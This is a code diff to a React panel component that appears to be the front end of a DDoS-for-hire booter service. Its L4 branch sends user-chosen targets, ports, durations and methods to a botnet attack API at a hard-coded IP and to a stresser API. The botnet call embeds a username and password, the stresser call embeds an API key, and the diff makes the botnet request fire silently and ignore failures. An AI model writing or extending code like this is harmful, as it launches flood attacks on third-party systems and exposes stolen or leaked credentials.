@@ -182,29 +182,29 @@ export default function Panel() {
 
     // Hit the L4 API if layer is L4
     if (layer === 'L4') {
-      try {
-        setApiError(null);
-        let apiUrl = '';
-        if (method === 'UDP-BOTNET') {
-          apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${target}&time=${finalDuration}&port=${port || '80'}&method=udpbig`;
-        } else {
+      setApiError(null);
+      if (method === 'UDP-BOTNET') {
+        // UDP-BOTNET uses HTTP endpoint — browser may block due to mixed-content policy
+        // Fire silently and always proceed regardless of result
+        const apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${target}&time=${finalDuration}&port=${port || '80'}&method=udpbig`;
+        fetch(apiUrl, { mode: 'no-cors' }).catch(() => {
+          // Silently ignore — mixed-content block is expected on HTTPS sites
+        });
+      } else {
+        try {
           const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
           let apiMethod = method;
           if (method === 'BGMI-V2') {
             apiMethod = 'UDP-BIG';
           }
-          apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
+          const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
+          await fetch(apiUrl, { mode: 'no-cors' });
+        } catch (err) {
+          console.error("API Hit Error:", err);
+          setApiError("Failed to connect to API or Network Error. Check target details.");
+          setIsAttacking(false);
+          return;
         }
-        
-        // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
-        // Note: With 'no-cors', we cannot read the response body or status.
-        // If the fetch completes without throwing a network error, we assume it was sent successfully.
-        await fetch(apiUrl, { mode: 'no-cors' }); 
-      } catch (err) {
-        console.error("API Hit Error:", err);
-        setApiError("Failed to connect to API or Network Error. Check target details.");
-        setIsAttacking(false);
-        return;
       }
     } else if (layer === 'L7') {
       try {
